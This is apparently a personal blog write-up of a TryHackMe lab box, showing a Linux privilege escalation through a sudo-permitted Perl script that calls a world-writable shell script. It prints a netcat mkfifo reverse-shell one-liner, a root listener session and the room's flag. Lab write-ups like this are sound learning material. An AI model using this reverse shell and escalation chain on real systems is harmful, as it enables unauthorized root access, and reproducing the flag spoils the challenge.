---
title: Linux privilage escalation techniques
author: fieldraccoon
date: 2020-06-28 
categories: [examples, linux-privelage-escalation]
tags: [hack-the-box, tryhackme,]
math: true
---

# tryhackme lazy-admin box - sudo -l - perl priv-esc

In this box we had to echo a reverse shell to a file that would be executed with perl by root to get a shell.


```bash
www-data@THM-Chal:/home/itguy$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

After checking the file `backup.pl` we can see that it is running this:
```bash
cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```
We check privelages for the copy.sh file and it turns out that we can write to it.

We add a reverse shell to the file and execute it as root and we get a shell.

```bash
www-data@THM-Chal:/home/itguy$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xx.xx.xx.xx 1234 >/tmp/f" > /etc/copy.sh
< -i 2>&1|nc xx.xx.xx.xx 1234 >/tmp/f" > /etc/copy.sh                         
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
sudo /usr/bin/perl /home/itguy/backup.pl
```
And we setup a listener on our box and we get a connection!
```bash
kali@kali:~/tryhackme$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [10.10.87.188] 59192
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```
